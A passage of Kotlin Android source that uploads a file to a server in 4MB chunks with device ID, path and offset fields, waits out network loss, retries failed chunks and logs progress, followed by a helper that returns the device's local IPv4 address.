    NetworkLogger.log("Chuncker", "Start stream upload: ${file.name} (${file.length() / 1024 / 1024}MB)")
    val chunkSize = 4L * 1024 * 1024 // 4MB chunks
    val totalSize = file.length()
    var offset = 0L
    val deviceId = NetworkLogger.getDeviceId()

    try {
        RandomAccessFile(file, "r").use { raf ->
            while (offset < totalSize) {
                if (!isNetworkAvailable()) {
                    NetworkLogger.logTransfer("File upload interrupted, waiting for resume")
                    NetworkLogger.log("Connection Lost", "Waiting for internet to resume ${file.name}")
                    while (!isNetworkAvailable()) {
                        delay(5000L)
                    }
                    NetworkLogger.log("Connection Restored", "Resuming upload for ${file.name}")
                }

                raf.seek(offset)
                val remaining = totalSize - offset
                val bytesToRead = if (remaining > chunkSize) chunkSize.toInt() else remaining.toInt()
                val buffer = ByteArray(bytesToRead)
                raf.readFully(buffer)

                val chunkBody = buffer.toRequestBody("application/octet-stream".toMediaType())
                val part = MultipartBody.Part.createFormData("chunkData", file.name, chunkBody)

                val reqDeviceId = deviceId.toRequestBody("text/plain".toMediaType())
                val reqFilePath = filePath.toRequestBody("text/plain".toMediaType())
                val reqOffset = offset.toString().toRequestBody("text/plain".toMediaType())
                val reqTotalSize = totalSize.toString().toRequestBody("text/plain".toMediaType())

                var attempts = 0
                var success = false
                var lastErrCode = 0
                var lastErrBody = ""
                var lastEx: Exception? = null

                while (attempts < 5 && !success) {
                    try {
                        val response = RetrofitClient.apiService.uploadChunk(
                            reqDeviceId, reqFilePath, reqOffset, reqTotalSize, part
                        )
                        if (response.isSuccessful) {
                            success = true
                        } else {
                            attempts++
                            lastErrCode = response.code()
                            lastErrBody = response.errorBody()?.string() ?: ""
                            delay(3000L * attempts)
                        }
                    } catch (e: Exception) {
                        attempts++
                        lastEx = e
                        delay(3000L * attempts)
                    }
                }

                if (!success) {
                    val errMsg = if (lastEx != null) lastEx.message else "HTTP $lastErrCode: $lastErrBody"
                    NetworkLogger.log("Chuncker", "Failed to upload chunk of ${file.name} at offset $offset permanently. Error: $errMsg. Aborting file.")
                    return // Abort uploading this file, proceed to the next one
                } else {
                    offset += bytesToRead
                    val progressPct = if (totalSize > 0) ((offset.toDouble() / totalSize) * 100).toInt() else 100
                    NetworkLogger.logTransfer("File upload in progress: $progressPct%")
                }
            }
        }
        NetworkLogger.log("Uploaded", "File completely uploaded: ${file.name}")
    } catch (e: Exception) {
        NetworkLogger.log("Chuncker", "Exception during upload of ${file.name}: ${e.message}")
    }
}

fun getLocalIpAddress(): String {
    try {
        val interfaces = NetworkInterface.getNetworkInterfaces()
        for (intf in interfaces) {
            val addrs = intf.inetAddresses
            for (addr in addrs) {
                if (!addr.isLoopbackAddress && addr is Inet4Address) {
                    return addr.hostAddress ?: ""
                }
            }
        }
    } catch (ex: Exception) { }
    return ""
}
